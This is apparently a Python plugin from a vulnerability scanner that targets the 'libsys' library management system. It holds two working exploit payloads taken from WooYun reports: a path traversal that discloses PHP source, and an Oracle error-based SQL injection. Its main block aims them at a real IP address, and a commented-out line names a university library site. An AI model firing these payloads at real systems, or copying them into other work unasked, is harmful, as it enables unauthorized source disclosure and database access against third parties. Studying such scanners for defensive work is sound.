#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 01001000entai

def assign(service, arg):
	if service == 'libsys':
		return True, arg

def audit(arg):
    #No.1 http://www.wooyun.org/bugs/wooyun-2010-067400
    payload = "zplug/ajax_asyn_link.php?url=../opac/search.php"
    target = arg + payload
    code, head, body, errcode, final_url = curl.curl2(target);
    if '<?php @Zend;' in body:
       security_hole(target)
    #No.2 http://www.wooyun.org/bugs/wooyun-2010-092533
    payload = "m/info/top_rating.action?clsNo=%00'%20AND%202050=(SELECT%20UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(106)||CHR(120)||CHR(113)||CHR(113)||(SELECT%20(CASE%20WHEN%20(2050=2050)%20THEN%201%20ELSE%200%20END)%20FROM%20DUAL)||CHR(104)||CHR(101)||CHR(110)||CHR(116)||CHR(97)||CHR(105)))%20FROM%20DUAL)%20AND%20'NpTg'='NpTg"
    target = arg + payload
    code, head, body, errcode, final_url = curl.curl2(target);
    if 'hentai' in body:
       security_hole(target)


if __name__ == '__main__':
    from dummy import *
    #audit(assign('libsys', 'http://lib.stdu.edu.cn/hwweb/')[1])                
    audit(assign('libsys', 'http://202.200.151.19:8081/')[1])